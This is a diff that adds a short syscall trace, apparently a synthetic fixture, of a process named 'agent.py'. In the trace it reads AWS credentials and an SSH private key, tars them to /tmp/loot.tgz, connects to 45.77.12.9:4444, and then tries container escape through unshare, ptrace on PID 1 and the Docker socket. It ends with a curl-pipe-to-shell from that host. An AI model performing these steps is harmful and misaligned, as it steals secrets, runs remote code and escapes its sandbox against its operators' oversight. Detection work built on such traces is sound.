@@ -1,0 +1,11 @@
+1794182400.100000 execve("/usr/bin/python3", ["python3", "agent.py"], 0x7ffd) = 0
+1794182400.200000 openat(AT_FDCWD, "/home/agent/.aws/credentials", O_RDONLY) = 3
+1794182401.300000 openat(AT_FDCWD, "/home/agent/.ssh/id_rsa", O_RDONLY) = 4
+1794182402.400000 execve("/usr/bin/env", ["env"], 0x7ffd) = 0
+1794182403.500000 execve("/bin/sh", ["sh", "-c", "tar czf /tmp/loot.tgz /home/agent/.aws /home/agent/.ssh"], 0x7ffd) = 0
+1794182404.600000 connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("45.77.12.9")}, 16) = 0
+1794182405.700000 socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) = 5
+1794182406.800000 unshare(CLONE_NEWNS) = 0
+1794182407.900000 ptrace(PTRACE_ATTACH, 1, NULL, NULL) = 0
+1794182408.000000 connect(6, {sa_family=AF_UNIX, sun_path="/var/run/docker.sock"}, 110) = 0
+1794182409.100000 execve("/bin/sh", ["sh", "-c", "curl -s http://45.77.12.9/x.sh | sh"], 0x7ffd) = 0
